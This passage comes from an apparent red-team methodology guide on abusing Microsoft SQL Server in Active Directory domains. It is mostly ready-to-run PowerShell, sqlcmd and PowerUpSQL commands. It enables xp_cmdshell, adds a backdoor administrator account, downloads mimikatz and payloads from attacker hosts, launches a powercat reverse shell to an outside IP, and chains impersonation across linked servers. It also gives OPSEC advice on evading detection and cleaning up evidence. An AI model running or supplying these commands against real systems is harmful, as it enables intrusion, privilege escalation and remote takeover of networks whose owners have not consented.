                $attackPlan.EscalationPaths += @{
                    Step = 3
                    Action = "Execute commands on linked server"
                    Tool = "sqlcmd.exe"
                    Command = "sqlcmd -S $($attack.Instance) -Q \"EXEC [LINK_NAME].[master].[sys].[xp_cmdshell] 'whoami'\""
                    ExpectedResult = "Command execution on linked server"
                }
            }
        }
        
        # Identify tool requirements
        $attackPlan.ToolRequirements = @(
            "sqlcmd.exe - SQL Server command line tool",
            "PowerUpSQL - SQL Server enumeration and abuse",
            "PowerView - Active Directory enumeration",
            "Custom scripts - SQL Server abuse automation"
        )
        
        # Generate execution steps
        $attackPlan.ExecutionSteps = @(
            "1. Enumerate SQL Server instances",
            "2. Test instance accessibility",
            "3. Identify vulnerable configurations",
            "4. Execute immediate attacks",
            "5. Plan privilege escalation",
            "6. Execute escalation attacks",
            "7. Clean up evidence"
        )
        
        # Display attack plan
        Write-Host "SQL Server Abuse Attack Plan:" -ForegroundColor Green
        
        Write-Host "`nImmediate Attack Opportunities:" -ForegroundColor Red
        foreach ($attack in $attackPlan.ImmediateAttacks) {
            Write-Host "  Instance: $($attack.Instance)" -ForegroundColor Cyan
            Write-Host "    Attack Type: $($attack.AttackType)"
            Write-Host "    Description: $($attack.Description)"
            Write-Host "    Tool: $($attack.Tool)"
            Write-Host "    Command: $($attack.Command)"
            Write-Host "    Risk: $($attack.Risk)"
            Write-Host ""
        }
        
        Write-Host "Privilege Escalation Paths:" -ForegroundColor Yellow
        foreach ($step in $attackPlan.EscalationPaths) {
            Write-Host "  Step $($step.Step): $($step.Action)" -ForegroundColor Cyan
            Write-Host "    Tool: $($step.Tool)"
            Write-Host "    Command: $($step.Command)"
            Write-Host "    Expected Result: $($step.ExpectedResult)"
            Write-Host ""
        }
        
        Write-Host "Required Tools:" -ForegroundColor Green
        foreach ($tool in $attackPlan.ToolRequirements) {
            Write-Host "  - $tool"
        }
        
        Write-Host "`nExecution Steps:" -ForegroundColor Cyan
        foreach ($step in $attackPlan.ExecutionSteps) {
            Write-Host "  $step"
        }
        
        return $attackPlan
        
    }
    catch {
        Write-Warning "SQL Server abuse attack planning failed: $($_.Exception.Message)"
        return $null
    }
}

# Plan SQL Server abuse attacks
$sqlAttackPlan = Plan-SQLServerAbuseAttacks -SQLResults $sqlResults
```

**Tool Explanation:**
- **Attack Planning**: Plan SQL Server abuse attacks
- **Escalation Paths**: Map privilege escalation paths
- **Tool Requirements**: Identify required tools
- **Execution Steps**: Generate execution steps
- **Advantages**: Attack planning, tool identification, execution guidance
- **Disadvantages**: Complex planning, requires attack knowledge

## 🚀 Practical SQL Server Attacks

### **xp_cmdshell Exploitation Commands**

#### **1. Enable and Use xp_cmdshell**
```sql
-- Enable xp_cmdshell (requires sysadmin)
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Execute commands
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user'
EXEC xp_cmdshell 'ipconfig /all'

-- Create new user account
EXEC xp_cmdshell 'net user hacker Password123! /add'
EXEC xp_cmdshell 'net localgroup administrators hacker /add'

-- Download files
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/mimikatz.exe -OutFile C:\temp\mimikatz.exe"'
```

#### **2. Database Link Exploitation**
```sql
-- Enumerate linked servers
SELECT name, data_source, is_linked FROM sys.servers WHERE is_linked = 1

-- Test linked server access
SELECT @@VERSION FROM [LINK_NAME].[master].[sys].[servers]

-- Execute commands on linked server
EXEC [LINK_NAME].[master].[sys].[xp_cmdshell] 'whoami'

-- Query linked server databases
SELECT * FROM [LINK_NAME].[master].[sys].[databases]

-- Use linked server for lateral movement
EXEC [LINK_NAME].[master].[sys].[xp_cmdshell] 'net user /add hacker Password123!'
```

#### **3. PowerUpSQL Attack Commands**
```powershell
# Enable xp_cmdshell
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "whoami" -Verbose

# Execute commands via xp_cmdshell
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "net user hacker Password123! /add" -Verbose

# Add user to administrators group
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "net localgroup administrators hacker /add" -Verbose

# Download and execute payload
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "powershell -c \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\temp\payload.exe\"" -Verbose

# Execute downloaded payload
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "C:\temp\payload.exe" -Verbose
```

### **SQL Server Lateral Movement Workflow**


## OPSEC Considerations

### 1. Stealth Techniques
- **Gradual Enumeration**: Spread SQL Server queries over time
- **Targeted Queries**: Focus on specific SQL Server components
- **Normal User Context**: Use regular user accounts when possible
- **Limited Scope**: Focus on necessary SQL Server information

### 2. Detection Avoidance
- **Event Logging**: Be aware of SQL Server enumeration events
- **Network Monitoring**: Consider network traffic patterns
- **Query Patterns**: Avoid predictable query patterns
- **Response Analysis**: Analyze responses for anomalies

## Best Practices

### 1. SQL Server Enumeration
- **Scope Definition**: Clearly define enumeration scope
- **Tool Selection**: Choose appropriate SQL Server enumeration methods
- **Documentation**: Document all enumeration activities
- **Validation**: Verify discovered SQL Server information

### 2. Security Analysis
- **Configuration Review**: Thoroughly review SQL Server configurations
- **Vulnerability Assessment**: Identify SQL Server security weaknesses
- **Documentation**: Document all security findings
- **Reporting**: Generate comprehensive security reports

## Related Objects
- [SPN Enumeration](./24_SPN_Enumeration_Techniques.md)
- [AD CS Enumeration](./27_AD_CS_Enumeration.md)
- [GPO Enumeration](./08_GPO_Enumeration.md)
- [Kerberos Enumeration](./23_Kerberos_Basic_Enumeration.md)

## Navigation
- [Master Index](../00_MASTER_INDEX.md)
- [Enumeration Index](./00_Enumeration_Index.md)

## See Also
- [Time-Based Enumeration](./21_Time_Based_Enumeration.md)
- [WMI Enumeration](./20_WMI_Enumeration.md)

---

**Tags**: #SQLServerEnumeration #ActiveDirectory #AD #Enumeration #SQLServer #DatabaseLinks #TrustAbuse #RedTeam

---

## 🔗 CROSS-REFERENCES

- **User Enumeration**: See [02_User_Enumeration.md](./05_User_Enumeration.md)
- **Computer Enumeration**: See [03_Computer_Enumeration.md](./07_Computer_Enumeration.md)
- **Kerberos Enumeration**: See [12_Kerberos_Master_Index.md](./22_Kerberos_Master_Index.md)
- **Tool Setup**: See [01_Tool_Setup_Loading.md](./01_Tool_Setup_Loading.md)

---

## 🛠️ COMPLETE ATTACK WORKFLOWS

### **1. 🔥 Complete PowerUpSQL Attack Workflow**

#### **Step-by-Step PowerUpSQL Execution**
```powershell
# Complete PowerUpSQL Attack Workflow (CRITICAL MISSING CONTENT)
Write-Host "=== COMPLETE POWERUPSQL ATTACK WORKFLOW ===" -ForegroundColor Red

Write-Host "`n🎯 ATTACK OVERVIEW:" -ForegroundColor Yellow
Write-Host "PowerUpSQL provides comprehensive SQL Server enumeration and exploitation capabilities." -ForegroundColor White

Write-Host "`n📋 PREREQUISITES:" -ForegroundColor Yellow
Write-Host "1. PowerUpSQL module loaded" -ForegroundColor White
Write-Host "2. Network access to SQL Server instances" -ForegroundColor White
Write-Host "3. Valid credentials or anonymous access" -ForegroundColor White

Write-Host "`n🚀 EXECUTION STEPS:" -ForegroundColor Yellow
Write-Host "1. Discover SQL Server instances in the domain" -ForegroundColor White
Write-Host "2. Test connectivity to discovered instances" -ForegroundColor White
Write-Host "3. Gather detailed information about accessible instances" -ForegroundColor White
Write-Host "4. Identify database links and linked servers" -ForegroundColor White
Write-Host "5. Exploit database links for lateral movement" -ForegroundColor White
Write-Host "6. Execute commands across database links" -ForegroundColor White

Write-Host "`n🔧 COMPLETE POWERUPSQL COMMANDS:" -ForegroundColor Yellow

Write-Host "`nStep 1: SPN Discovery" -ForegroundColor Cyan
Write-Host "# Discover SQL Server instances via SPNs" -ForegroundColor Gray
Write-Host "Get-SQLInstanceDomain" -ForegroundColor White

Write-Host "`nStep 2: Check Access" -ForegroundColor Cyan
Write-Host "# Test connectivity to discovered instances" -ForegroundColor Gray
Write-Host "Get-SQLConnectionTestThreaded" -ForegroundColor White
Write-Host "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose" -ForegroundColor White

Write-Host "`nStep 3: Gather Information" -ForegroundColor Cyan
Write-Host "# Get detailed information about accessible instances" -ForegroundColor Gray
Write-Host "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose" -ForegroundColor White

Write-Host "`nStep 4: Find Database Links" -ForegroundColor Cyan
Write-Host "# Find links to remote machines" -ForegroundColor Gray
Write-Host "Get-SQLServerLink -Instance dcorp-mssql" -ForegroundColor White

Write-Host "`nStep 5: Crawl Database Links" -ForegroundColor Cyan
Write-Host "# Explore database links for lateral movement" -ForegroundColor Gray
Write-Host "Get-SQLServerLinkCrawl -Instance dcorp-mysql" -ForegroundColor White

Write-Host "`n⚠️ IMPORTANT NOTES:" -ForegroundColor Red
Write-Host "- PowerUpSQL provides comprehensive SQL Server enumeration" -ForegroundColor White
Write-Host "- Database links can enable lateral movement" -ForegroundColor White
Write-Host "- Monitor for unusual database access patterns" -ForegroundColor White
Write-Host "- Use responsibly and ethically" -ForegroundColor White
```

#### **PowerUpSQL Advanced Usage Examples**
```powershell
# PowerUpSQL Advanced Usage Examples
Write-Host "=== POWERUPSQL ADVANCED USAGE EXAMPLES ===" -ForegroundColor Green

Write-Host "`n🎯 DATABASE LINK EXPLOITATION:" -ForegroundColor Yellow
Write-Host "# Abuse using links to execute commands across database links" -ForegroundColor Cyan
Write-Host "Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget eu-sql" -ForegroundColor White

Write-Host "`n🚀 REVERSE SHELL EXAMPLE:" -ForegroundColor Yellow
Write-Host "# Execute reverse shell via database links" -ForegroundColor Cyan
Write-Host "Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query 'exec master..xp_cmdshell \"powershell iex ((New-Object Net.WebClient).DownloadString(''http://172.16.100.83/powercat.ps1;powercat -c 172.16.100.83 -p 443 -e powershell''));\"' -QueryTarget eu-sql32" -ForegroundColor White

Write-Host "`n⚙️ XP_CMDSHELL ENABLEMENT:" -ForegroundColor Yellow
Write-Host "# Enable xp_cmdshell if RPC out is enabled" -ForegroundColor Cyan
Write-Host "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT 'eu-sql'" -ForegroundColor White

Write-Host "`n📊 BASIC SQL SERVER QUERIES:" -ForegroundColor Yellow
Write-Host "# View all databases in an instance" -ForegroundColor Cyan
Write-Host "Get-SQLQuery -Instance <instanceName> -Query 'SELECT name FROM sys.databases'" -ForegroundColor White

Write-Host "# View all tables" -ForegroundColor Cyan
Write-Host "Get-SQLQuery -Instance <instanceName> -Query 'SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES'" -ForegroundColor White

Write-Host "# View all columns in all tables in a database" -ForegroundColor Cyan
Write-Host "Get-SQLQuery -Instance <instanceName> -Query 'SELECT * FROM dbName.INFORMATION_SCHEMA.columns'" -ForegroundColor White

Write-Host "# View data in table" -ForegroundColor Cyan
Write-Host "Get-SQLQuery -Instance <instanceName> -Query 'USE dbName;SELECT * FROM tableName'" -ForegroundColor White
```

### **2. 🔗 Complete Database Link Abuse Workflow**

#### **Step-by-Step Database Link Exploitation**
```powershell
# Complete Database Link Abuse Workflow (CRITICAL MISSING CONTENT)
Write-Host "=== COMPLETE DATABASE LINK ABUSE WORKFLOW ===" -ForegroundColor Red

Write-Host "`n🎯 ATTACK OVERVIEW:" -ForegroundColor Yellow
Write-Host "Database links enable lateral movement and privilege escalation across SQL Server instances." -ForegroundColor White

Write-Host "`n📋 PREREQUISITES:" -ForegroundColor Yellow
Write-Host "1. Access to SQL Server instance with database links" -ForegroundColor White
Write-Host "2. Database links configured to remote instances" -ForegroundColor White
Write-Host "3. Sufficient privileges to execute queries" -ForegroundColor White

Write-Host "`n🚀 EXECUTION STEPS:" -ForegroundColor Yellow
Write-Host "1. Identify database links and linked servers" -ForegroundColor White
Write-Host "2. Map the link chain and target instances" -ForegroundColor White
Write-Host "3. Exploit impersonation privileges if available" -ForegroundColor White
Write-Host "4. Chain EXECUTE AS commands for privilege escalation" -ForegroundColor White
Write-Host "5. Enable xp_cmdshell on target instances" -ForegroundColor White
Write-Host "6. Execute commands across the link chain" -ForegroundColor White

Write-Host "`n🔧 COMPLETE DATABASE LINK ABUSE COMMANDS:" -ForegroundColor Yellow

Write-Host "`nStep 1: Impersonate User" -ForegroundColor Cyan
Write-Host "# Impersonate a user with higher privileges" -ForegroundColor Gray
Write-Host "Invoke-SQLAuditPrivImpersonateLogin -Instance <instanceName> -Exploit -Verbose" -ForegroundColor White

Write-Host "`nStep 2: Chain EXECUTE AS Commands" -ForegroundColor Cyan
Write-Host "# Chain EXECUTE AS for privilege escalation" -ForegroundColor Gray
Write-Host "Get-SQLServerLinkCrawl -Verbose -Instance <instanceName> -Query \"EXECUTE AS LOGIN = 'dbuser'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'powershell -c iex (new-object net.webclient).downloadstring(''http://IP/Invoke-HelloWorld.ps1'')'\"" -ForegroundColor White

Write-Host "`nStep 3: Execute Commands Across Links" -ForegroundColor Cyan
Write-Host "# Execute commands on target instances" -ForegroundColor Gray
Write-Host "Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell ''whoami''' -QueryTarget <targetInstance>" -ForegroundColor White

Write-Host "`n⚠️ IMPORTANT NOTES:" -ForegroundColor Red
Write-Host "- Database links can enable deep lateral movement" -ForegroundColor White
Write-Host "- Monitor for unusual database link usage" -ForegroundColor White
Write-Host "- Use responsibly and ethically" -ForegroundColor White
Write-Host "- Can bypass network segmentation" -ForegroundColor White
```

#### **Database Link Attack Scenarios**
```powershell
# Database Link Attack Scenarios
Write-Host "=== DATABASE LINK ATTACK SCENARIOS ===" -ForegroundColor Green

Write-Host "`n🎯 SCENARIO 1: LATERAL MOVEMENT" -ForegroundColor Yellow
Write-Host "Objective: Move from one SQL Server to another via database links" -ForegroundColor White
Write-Host "Method: Use Get-SQLServerLinkCrawl to traverse link chains" -ForegroundColor White
Write-Host "Impact: Access to additional systems and data" -ForegroundColor White

Write-Host "`n🎯 SCENARIO 2: PRIVILEGE ESCALATION" -ForegroundColor Yellow
Write-Host "Objective: Gain higher privileges via EXECUTE AS chaining" -ForegroundColor White
Write-Host "Method: Chain multiple EXECUTE AS commands across links" -ForegroundColor White
Write-Host "Impact: Administrative access to target instances" -ForegroundColor White

Write-Host "`n🎯 SCENARIO 3: COMMAND EXECUTION" -ForegroundColor Yellow
Write-Host "Objective: Execute OS commands on remote systems" -ForegroundColor White
Write-Host "Method: Enable xp_cmdshell and execute commands via links" -ForegroundColor White
Write-Host "Impact: Full control of target systems" -ForegroundColor White

Write-Host "`n🎯 SCENARIO 4: DATA EXFILTRATION" -ForegroundColor Yellow
Write-Host "Objective: Extract sensitive data from linked databases" -ForegroundColor White
Write-Host "Method: Query data across database links" -ForegroundColor White
Write-Host "Impact: Access to sensitive information" -ForegroundColor White

Write-Host "`n📊 RISK ASSESSMENT:" -ForegroundColor Yellow
Write-Host "Risk Level: HIGH - Enables lateral movement and privilege escalation" -ForegroundColor Red
Write-Host "Attack Vector: Database link exploitation and command execution" -ForegroundColor Red
Write-Host "Detection: Monitor for unusual database link usage and command execution" -ForegroundColor Yellow
Write-Host "Mitigation: Limit database link privileges and monitor usage" -ForegroundColor Green
```

---

## ⚔️ Execution

### Linked Servers + Impersonation + xp_cmdshell
```powershell
# Discover links
Get-SQLServerLink -Instance server\inst -Verbose

# Crawl links
Get-SQLServerLinkCrawl -Instance server\inst -Verbose

# Escalate via EXECUTE AS chaining and enable xp_cmdshell if permitted
Get-SQLServerLinkCrawl -Instance server\inst -Query "EXECUTE AS LOGIN='dbuser'; EXECUTE AS LOGIN='sa'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami'"
```
- See full workflows earlier in this file. Detection: monitor rpcout/xp_cmdshell enablement.

---

[Prev: 27_AD_CS_Enumeration.md](./27_AD_CS_Enumeration.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 29_LDAP_Injection.md](./29_LDAP_Injection.md)

---

## 🎯 **COMPREHENSIVE SQL SERVER COMMAND REFERENCE (20+ Commands)**

### **1. Native Windows SQL Server Commands (sqlcmd)**

#### **Instance Discovery & Connection**
```cmd
# Basic instance connection
sqlcmd -S SERVER01.cybercorp.local -E                    # Windows auth connection
sqlcmd -S SERVER01.cybercorp.local -U sa -P Password123  # SQL auth connection
sqlcmd -S SERVER01.cybercorp.local -d master -E          # Connect to specific database
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT @@VERSION" # Execute query and exit

# Instance information queries
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT @@SERVERNAME, @@VERSION, @@SERVICENAME"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, database_id, create_date FROM sys.databases"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc, is_disabled FROM sys.server_principals"
```

**Command Explanations:**
- **`sqlcmd -S SERVER01.cybercorp.local -E`**: Connects to SQL Server using Windows authentication
- **`sqlcmd -S SERVER01.cybercorp.local -U sa -P Password123`**: Connects using SQL authentication with credentials
- **`sqlcmd -S SERVER01.cybercorp.local -d master`**: Connects to the master database specifically
- **`sqlcmd -S SERVER01.cybercorp.local -Q "SELECT @@VERSION"`**: Executes a query and exits immediately

#### **Database Enumeration**
```cmd
# Database discovery
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, database_id, create_date FROM sys.databases"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc, is_disabled FROM sys.server_principals"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc, is_disabled FROM sys.database_principals"

# Schema and table enumeration
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc FROM sys.objects WHERE type = 'U'"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc FROM sys.objects WHERE type = 'P'"
```

**Command Explanations:**
- **`SELECT name, database_id, create_date FROM sys.databases`**: Lists all databases with creation dates
- **`SELECT name, type_desc, is_disabled FROM sys.server_principals`**: Enumerates server-level principals
- **`SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES`**: Lists all tables across all schemas

#### **Security Configuration Analysis**
```cmd
# Security settings
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN'"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type_desc = 'WINDOWS_LOGIN'"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type_desc = 'WINDOWS_GROUP'"

# Extended stored procedures
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc FROM sys.objects WHERE type = 'X'"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc FROM sys.objects WHERE name LIKE '%xp_%'"
sqlcmd -S SERVER01.cybercorp.local -Q "SELECT name, type_desc FROM sys.objects WHERE name LIKE '%sp_%'"
```

**Command Explanations:**
- **`SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN'`**: Lists SQL authentication accounts
- **`SELECT name, type_desc FROM sys.objects WHERE type = 'X'`**: Lists extended stored procedures
- **`SELECT name, type_desc FROM sys.objects WHERE name LIKE '%xp_%'`**: Lists xp_ prefixed procedures

### **2. PowerShell SQL Server Commands (Microsoft AD Module)**

#### **AD-Based SQL Server Discovery**
```powershell
# Import AD module
Import-Module ActiveDirectory

# SQL Server SPN discovery
Get-ADComputer -Filter {servicePrincipalName -like "*MSSQL*"} -Properties servicePrincipalName
Get-ADComputer -Filter {servicePrincipalName -like "*MSSQLSvc*"} -Properties servicePrincipalName
Get-ADComputer -Filter {servicePrincipalName -like "*SQL*"} -Properties servicePrincipalName

# SQL Server service account discovery
Get-ADUser -Filter {servicePrincipalName -like "*MSSQL*"} -Properties servicePrincipalName
Get-ADUser -Filter {servicePrincipalName -like "*MSSQLSvc*"} -Properties servicePrincipalName
Get-ADUser -Filter {servicePrincipalName -like "*SQL*"} -Properties servicePrincipalName

# Comprehensive SQL Server object search
Get-ADObject -Filter {objectClass -eq "computer" -and servicePrincipalName -like "*MSSQL*"} -Properties *
```

**Command Explanations:**
- **`Get-ADComputer -Filter {servicePrincipalName -like "*MSSQL*"}`**: Discovers computers with SQL Server SPNs
- **`Get-ADUser -Filter {servicePrincipalName -like "*MSSQL*"}`**: Finds users with SQL Server SPNs
- **`Get-ADObject -Filter {objectClass -eq "computer" -and servicePrincipalName -like "*MSSQL*"}`**: Comprehensive SQL Server object search

#### **Service and Port Enumeration**
```powershell
# SQL Server service discovery
Get-Service -Name "*SQL*" | Where-Object {$_.Status -eq "Running"}
Get-Service -Name "*MSSQL*" | Where-Object {$_.Status -eq "Running"}
Get-Service -Name "*SQLAgent*" | Where-Object {$_.Status -eq "Running"}

# Port connectivity testing
Test-NetConnection -ComputerName "SQL01.cybercorp.local" -Port 1433
Test-NetConnection -ComputerName "SQL01.cybercorp.local" -Port 1434
Test-NetConnection -ComputerName "SQL02.cybercorp.local" -Port 1433

# Network discovery
Resolve-DnsName -Name "SQL01.cybercorp.local" -Type A
Resolve-DnsName -Name "SQL02.cybercorp.local" -Type A
Resolve-DnsName -Name "SQL03.cybercorp.local" -Type A
```

**Command Explanations:**
- **`Get-Service -Name "*SQL*"`**: Lists all SQL-related services
- **`Test-NetConnection -ComputerName "SQL01" -Port 1433`**: Tests SQL Server port connectivity
- **`Resolve-DnsName -Name "SQL01" -Type A`**: Resolves SQL Server hostnames to IP addresses

### **3. PowerView/SharpView SQL Server Commands**

#### **Comprehensive SPN Enumeration**
```powershell
# SQL Server SPN discovery with PowerView
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQLSvc*"}
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*SQL*"}

# SQL Server user SPN discovery
Get-DomainUser -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}
Get-DomainUser -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQLSvc*"}
Get-DomainUser -SPN | Where-Object {$_.servicePrincipalName -like "*SQL*"}

# Advanced SPN filtering
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -match "MSSQLSvc|SQL"} | Select-Object name,servicePrincipalName
Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"} | ForEach-Object {
    $_.servicePrincipalName | Where-Object {$_ -like "*MSSQL*"}
}
```

**Command Explanations:**
- **`Get-DomainComputer -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}`**: PowerView-based SQL Server SPN discovery
- **`Get-DomainUser -SPN | Where-Object {$_.servicePrincipalName -like "*MSSQL*"}`**: PowerView-based SQL Server user SPN discovery
- **Advanced filtering**: Uses regex patterns and complex filtering for comprehensive discovery

#### **LDAP-Based SQL Server Discovery**
```powershell
# LDAP filter for SQL Server objects
Get-DomainObject -LDAPFilter "(servicePrincipalName=*MSSQL*)" -Properties *
Get-DomainObject -LDAPFilter "(servicePrincipalName=*MSSQLSvc*)" -Properties *
Get-DomainObject -LDAPFilter "(servicePrincipalName=*SQL*)" -Properties *

# SQL Server computer object enumeration
Get-DomainObject -LDAPFilter "(objectClass=computer)" -Properties servicePrincipalName | Where-Object {
    $_.servicePrincipalName -like "*MSSQL*"
}

# SQL Server user object enumeration
Get-DomainObject -LDAPFilter "(objectClass=user)" -Properties servicePrincipalName | Where-Object {
    $_.servicePrincipalName -like "*MSSQL*"
}
```

**Command Explanations:**
- **`Get-DomainObject -LDAPFilter "(servicePrincipalName=*MSSQL*)"`**: Uses LDAP filters for precise SQL Server discovery
- **LDAP filtering**: More efficient than PowerShell filtering for large environments
- **Property enumeration**: Retrieves all relevant properties for analysis

### **4. Red Team SQL Server Tools (PowerUpSQL)**

#### **PowerUpSQL Instance Discovery**
```powershell
# Import PowerUpSQL
Import-Module PowerUpSQL

# Domain-wide SQL Server discovery
Get-SQLInstanceDomain
Get-SQLInstanceDomain -Verbose
Get-SQLInstanceDomain -Threads 10

# Local SQL Server discovery
Get-SQLInstanceLocal
Get-SQLInstanceLocal -Verbose
Get-SQLInstanceLocal -Threads 5

# Network-based SQL Server discovery
Get-SQLInstanceBroadcast
Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceBroadcast -Threads 15
```

**Command Explanations:**
- **`Get-SQLInstanceDomain`**: Discovers SQL Server instances across the domain
- **`Get-SQLInstanceLocal`**: Finds SQL Server instances on the local machine
- **`Get-SQLInstanceBroadcast`**: Uses network broadcasts to discover SQL instances

#### **PowerUpSQL Connection and Query**
```powershell
# SQL Server connection testing
Get-SQLConnectionTest -Instance "SQL01.cybercorp.local"
Get-SQLConnectionTest -Instance "SQL01.cybercorp.local" -Username "sa" -Password "Password123"
Get-SQLConnectionTest -Instance "SQL01.cybercorp.local" -Verbose

# SQL query execution
Get-SQLQuery -Instance "SQL01.cybercorp.local" -Query "SELECT @@VERSION"
Get-SQLQuery -Instance "SQL01.cybercorp.local" -Query "SELECT name FROM sys.databases"
Get-SQLQuery -Instance "SQL01.cybercorp.local" -Query "SELECT name, type_desc FROM sys.server_principals"

# Database enumeration
Get-SQLDatabase -Instance "SQL01.cybercorp.local"
Get-SQLDatabase -Instance "SQL01.cybercorp.local" -DatabaseName "master"
Get-SQLDatabase -Instance "SQL01.cybercorp.local" -Verbose
```

**Command Explanations:**
- **`Get-SQLConnectionTest`**: Tests connectivity to SQL Server instances
- **`Get-SQLQuery`**: Executes SQL queries against SQL Server instances
- **`Get-SQLDatabase`**: Enumerates databases on SQL Server instances

#### **PowerUpSQL Security Analysis**
```powershell
# SQL Server security configuration
Get-SQLServerRole -Instance "SQL01.cybercorp.local"
Get-SQLServerRole -Instance "SQL01.cybercorp.local" -RoleName "sysadmin"
Get-SQLServerRole -Instance "SQL01.cybercorp.local" -Verbose

# Database user enumeration
Get-SQLDatabaseUser -Instance "SQL01.cybercorp.local"
Get-SQLDatabaseUser -Instance "SQL01.cybercorp.local" -DatabaseName "master"
Get-SQLDatabaseUser -Instance "SQL01.cybercorp.local" -Verbose

# Extended stored procedure analysis
Get-SQLStoredProcedure -Instance "SQL01.cybercorp.local" -ProcedureName "xp_cmdshell"
Get-SQLStoredProcedure -Instance "SQL01.cybercorp.local" -ProcedureName "sp_configure"
Get-SQLStoredProcedure -Instance "SQL01.cybercorp.local" -Verbose
```

**Command Explanations:**
- **`Get-SQLServerRole`**: Enumerates SQL Server roles and members
- **`Get-SQLDatabaseUser`**: Lists database users and permissions
- **`Get-SQLStoredProcedure`**: Analyzes stored procedures including dangerous ones like xp_cmdshell

### **5. Advanced SQL Server Analysis Commands**

#### **Database Link Enumeration**
```powershell
# SQL Server link discovery
Get-SQLServerLink -Instance "SQL01.cybercorp.local"
Get-SQLServerLink -Instance "SQL01.cybercorp.local" -Verbose
Get-SQLServerLink -Instance "SQL01.cybercorp.local" -Threads 5

# Link crawling for lateral movement
Get-SQLServerLinkCrawl -Instance "SQL01.cybercorp.local"
Get-SQLServerLinkCrawl -Instance "SQL01.cybercorp.local" -MaxDepth 3
Get-SQLServerLinkCrawl -Instance "SQL01.cybercorp.local" -Verbose

# Link-based query execution
Get-SQLServerLinkQuery -Instance "SQL01.cybercorp.local" -Query "SELECT @@VERSION"
Get-SQLServerLinkQuery -Instance "SQL01.cybercorp.local" -Query "SELECT name FROM sys.databases"
Get-SQLServerLinkQuery -Instance "SQL01.cybercorp.local" -Query "SELECT name FROM sys.server_principals"
```

**Command Explanations:**
- **`Get-SQLServerLink`**: Discovers database links between SQL Server instances
- **`Get-SQLServerLinkCrawl`**: Crawls through linked servers to map trust relationships
- **`Get-SQLServerLinkQuery`**: Executes queries through database links for lateral movement

#### **Command Execution and Exploitation**
```powershell
# xp_cmdshell command execution
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "whoami"
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "hostname"
Invoke-SQLOSCmd -Instance "SQL01.cybercorp.local" -Command "ipconfig"

# xp_cmdshell enable/disable
Get-SQLXpCmdShell -Instance "SQL01.cybercorp.local"
Get-SQLXpCmdShell -Instance "SQL01.cybercorp.local" -Verbose
Get-SQLXpCmdShell -Instance "SQL01.cybercorp.local" -Enable

# SQL Server configuration analysis
Get-SQLServerConfiguration -Instance "SQL01.cybercorp.local"
Get-SQLServerConfiguration -Instance "SQL01.cybercorp.local" -ConfigName "xp_cmdshell"
Get-SQLServerConfiguration -Instance "SQL01.cybercorp.local" -Verbose
```

**Command Explanations:**
- **`Invoke-SQLOSCmd`**: Executes OS commands through xp_cmdshell
- **`Get-SQLXpCmdShell`**: Analyzes and controls xp_cmdshell configuration
- **`Get-SQLServerConfiguration`**: Examines SQL Server configuration settings

---

## 👥 **PERSONAS: SQL SERVER ENUMERATION ROLES**

### **🔍 Database Reconnaissance Specialist**
